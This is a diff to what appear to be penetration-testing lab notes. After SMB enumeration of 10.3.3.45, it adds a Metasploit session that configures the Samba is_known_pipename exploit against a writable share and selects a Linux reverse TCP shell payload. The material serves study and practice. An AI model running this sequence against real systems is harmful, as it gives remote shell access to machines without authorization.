@@ -208,3 +208,52 @@ nmap <host> -sV -sC
 smbclient -L 10.3.3.45
 smbclient //10.3.3.45/weytechshare -c ls
 ```
+```
+sudo msfconsole
+msf5 > use exploit/linux/samba/is_known_pipename
+msf5 exploit(linux/samba/is_known_pipename) > show options
+
+Module options (exploit/linux/samba/is_known_pipename):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   RHOSTS          10.3.3.45        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT           445              yes       The SMB service port (TCP)
+   SMB_FOLDER                       no        The directory to use within the writeable SMB share
+   SMB_SHARE_NAME  weytechshare     no        The name of the SMB share containing a writeable directory
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   3   Linux x86_64
+
+
+msf5 exploit(linux/samba/is_known_pipename) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                  Disclosure Date  Rank    Check  Description
+   -   ----                                  ---------------  ----    -----  -----------
+   0   generic/custom                                         normal  No     Custom Payload
+   1   generic/shell_bind_tcp                                 normal  No     Generic Command Shell, Bind TCP Inline
+   2   generic/shell_reverse_tcp                              normal  No     Generic Command Shell, Reverse TCP Inline
+   3   linux/x64/exec                                         normal  No     Linux Execute Command
+   4   linux/x64/meterpreter/bind_tcp                         normal  No     Linux Mettle x64, Bind TCP Stager
+   5   linux/x64/meterpreter/reverse_tcp                      normal  No     Linux Mettle x64, Reverse TCP Stager
+   6   linux/x64/pingback_bind_tcp                            normal  No     Linux x64 Pingback, Bind TCP Inline
+   7   linux/x64/pingback_reverse_tcp                         normal  No     Linux x64 Pingback, Reverse TCP Inline
+   8   linux/x64/shell/bind_tcp                               normal  No     Linux Command Shell, Bind TCP Stager
+   9   linux/x64/shell/reverse_tcp                            normal  No     Linux Command Shell, Reverse TCP Stager
+   10  linux/x64/shell_bind_ipv6_tcp                          normal  No     Linux x64 Command Shell, Bind TCP Inline (IPv6)
+   11  linux/x64/shell_bind_tcp                               normal  No     Linux Command Shell, Bind TCP Inline
+   12  linux/x64/shell_bind_tcp_random_port                   normal  No     Linux Command Shell, Bind TCP Random Port Inline
+   13  linux/x64/shell_reverse_ipv6_tcp                       normal  No     Linux x64 Command Shell, Reverse TCP Inline (IPv6)
+   14  linux/x64/shell_reverse_tcp                            normal  No     Linux Command Shell, Reverse TCP Inline
+
+msf5 exploit(linux/samba/is_known_pipename) > set payload 9
+payload => linux/x64/shell/reverse_tcp
+
+```
